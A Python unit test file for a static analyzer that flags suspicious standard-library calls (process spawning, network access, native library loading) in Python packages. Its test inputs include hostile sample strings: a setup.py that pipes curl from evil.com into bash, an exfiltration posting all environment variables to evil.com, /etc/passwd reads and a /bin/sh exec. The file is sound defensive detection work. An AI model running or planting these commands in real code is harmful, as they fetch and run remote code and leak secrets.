"""Tests for pydepgate.analyzers.suspicious_stdlib."""

import unittest

from pydepgate.analyzers.suspicious_stdlib import SuspiciousStdlibAnalyzer
from pydepgate.analyzers.base import Confidence, Scope
from pydepgate.parsers.pysource import parse_python_source


def _analyze(source: str) -> list:
    parsed = parse_python_source(source.encode("utf-8"), "<test>")
    analyzer = SuspiciousStdlibAnalyzer()
    return list(analyzer.analyze_python(parsed))


def _ids(signals) -> list[str]:
    return [s.signal_id for s in signals]


# =============================================================================
# Tier 1: Process spawning (STDLIB001)
# =============================================================================

class ProcessSpawnTests(unittest.TestCase):

    def test_subprocess_popen_fires(self):
        source = (
            "import subprocess\n"
            "subprocess.Popen(['ls'])\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB001", _ids(signals))
        sig = next(s for s in signals if s.signal_id == "STDLIB001")
        self.assertEqual(sig.context["function"], "subprocess.Popen")
        self.assertEqual(sig.context["category"], "process_spawn")

    def test_subprocess_run_fires(self):
        source = (
            "import subprocess\n"
            "subprocess.run(['ls'])\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB001", _ids(signals))

    def test_subprocess_check_output_fires(self):
        source = (
            "import subprocess\n"
            "subprocess.check_output(['cat', '/etc/passwd'])\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB001", _ids(signals))

    def test_os_system_fires(self):
        source = (
            "import os\n"
            "os.system('curl evil.example.com')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB001", _ids(signals))

    def test_os_popen_fires(self):
        source = (
            "import os\n"
            "os.popen('whoami')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB001", _ids(signals))

    def test_os_execv_fires(self):
        source = (
            "import os\n"
            "os.execv('/bin/sh', ['sh'])\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB001", _ids(signals))

    def test_os_fork_fires(self):
        source = (
            "import os\n"
            "os.fork()\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB001", _ids(signals))

    def test_module_scope_recorded(self):
        source = (
            "import os\n"
            "os.system('echo hi')\n"
        )
        signals = _analyze(source)
        sig = next(s for s in signals if s.signal_id == "STDLIB001")
        self.assertEqual(sig.scope, Scope.MODULE)

    def test_function_scope_recorded(self):
        source = (
            "import os\n"
            "def runner():\n"
            "    os.system('echo hi')\n"
        )
        signals = _analyze(source)
        sig = next(s for s in signals if s.signal_id == "STDLIB001")
        self.assertEqual(sig.scope, Scope.FUNCTION)


# =============================================================================
# Tier 2: Network access (STDLIB002)
# =============================================================================

class NetworkAccessTests(unittest.TestCase):

    def test_urllib_urlopen_fires(self):
        source = (
            "import urllib.request\n"
            "urllib.request.urlopen('http://example.com')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB002", _ids(signals))

    def test_urllib_urlretrieve_fires(self):
        source = (
            "import urllib.request\n"
            "urllib.request.urlretrieve('http://evil.com/payload', '/tmp/x')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB002", _ids(signals))

    def test_socket_socket_fires(self):
        source = (
            "import socket\n"
            "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB002", _ids(signals))

    def test_http_client_fires(self):
        source = (
            "import http.client\n"
            "conn = http.client.HTTPSConnection('evil.com')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB002", _ids(signals))

    def test_ftplib_fires(self):
        source = (
            "import ftplib\n"
            "ftplib.FTP('ftp.example.com')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB002", _ids(signals))

    def test_smtplib_fires(self):
        source = (
            "import smtplib\n"
            "smtplib.SMTP('mail.example.com')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB002", _ids(signals))


# =============================================================================
# Tier 3: Native code loading (STDLIB003)
# =============================================================================

class NativeLoadTests(unittest.TestCase):

    def test_ctypes_cdll_fires(self):
        source = (
            "import ctypes\n"
            "lib = ctypes.CDLL('libc.so.6')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB003", _ids(signals))
        sig = next(s for s in signals if s.signal_id == "STDLIB003")
        self.assertEqual(sig.context["function"], "ctypes.CDLL")

    def test_ctypes_windll_fires(self):
        source = (
            "import ctypes\n"
            "lib = ctypes.WinDLL('kernel32')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB003", _ids(signals))

    def test_ctypes_cdll_loadlibrary_fires(self):
        source = (
            "import ctypes\n"
            "lib = ctypes.cdll.LoadLibrary('libc.so.6')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB003", _ids(signals))


# =============================================================================
# Tier 4: False positive battery
# =============================================================================

class FalsePositiveBattery(unittest.TestCase):

    def test_import_alone_does_not_fire(self):
        # Just importing subprocess should not produce signals.
        source = "import subprocess\n"
        signals = _analyze(source)
        self.assertEqual(_ids(signals), [])

    def test_subprocess_attribute_access_does_not_fire(self):
        # Accessing an attribute (not calling) does not fire.
        source = (
            "import subprocess\n"
            "DEVNULL = subprocess.DEVNULL\n"
        )
        signals = _analyze(source)
        self.assertEqual(_ids(signals), [])

    def test_string_mentioning_subprocess_does_not_fire(self):
        source = "msg = 'subprocess.Popen is dangerous'\n"
        signals = _analyze(source)
        self.assertEqual(_ids(signals), [])

    def test_unrelated_code_produces_no_signals(self):
        source = (
            "import os\n"
            "import sys\n"
            "\n"
            "def main():\n"
            "    return os.path.join('a', 'b')\n"
        )
        signals = _analyze(source)
        self.assertEqual(_ids(signals), [])

    def test_aliased_import_misses_known_limitation(self):
        # Documented limitation: aliased imports are not caught.
        # When this is fixed in a future version, flip the assertion.
        source = (
            "from subprocess import Popen as P\n"
            "P(['ls'])\n"
        )
        signals = _analyze(source)
        # Currently does NOT fire because qualified name is just 'P'.
        self.assertEqual(_ids(signals), [])


# =============================================================================
# Tier 5: Robustness
# =============================================================================

class RobustnessTests(unittest.TestCase):

    def test_unparseable_source_produces_no_signals(self):
        signals = _analyze("def (\n")
        self.assertEqual(signals, [])

    def test_empty_source_produces_no_signals(self):
        signals = _analyze("")
        self.assertEqual(signals, [])

    def test_call_with_zero_args_does_not_crash(self):
        source = (
            "import os\n"
            "os.fork()\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB001", _ids(signals))

    def test_nested_calls_produce_correct_signals(self):
        source = (
            "import subprocess\n"
            "import os\n"
            "subprocess.run(['echo', os.popen('whoami').read()])\n"
        )
        signals = _analyze(source)
        # Both subprocess.run and os.popen should fire.
        self.assertEqual(_ids(signals).count("STDLIB001"), 2)


# =============================================================================
# Tier 6: Real-world patterns
# =============================================================================

class RealWorldPatternTests(unittest.TestCase):
    """Patterns drawn from analysis of actual PyPI malware."""

    def test_setup_py_curl_pattern(self):
        # Common: setup.py executes a curl-and-pipe-to-bash command.
        source = (
            "from setuptools import setup\n"
            "import os\n"
            "os.system('curl http://evil.com/payload | bash')\n"
            "setup(name='innocent_lookin', version='1.0')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB001", _ids(signals))

    def test_setup_py_data_exfil_pattern(self):
        # Data exfil via urllib + os.environ.
        source = (
            "import urllib.request\n"
            "import os\n"
            "import json\n"
            "data = json.dumps(dict(os.environ))\n"
            "urllib.request.urlopen('http://evil.com/collect', data.encode())\n"
        )
        signals = _analyze(source)
        # urllib.urlopen fires STDLIB002.
        self.assertIn("STDLIB002", _ids(signals))

    def test_init_py_native_load(self):
        # Suspicious: __init__.py loading a native library.
        source = (
            "import ctypes\n"
            "_lib = ctypes.CDLL('./_payload.so')\n"
        )
        signals = _analyze(source)
        self.assertIn("STDLIB003", _ids(signals))


if __name__ == "__main__":
    unittest.main()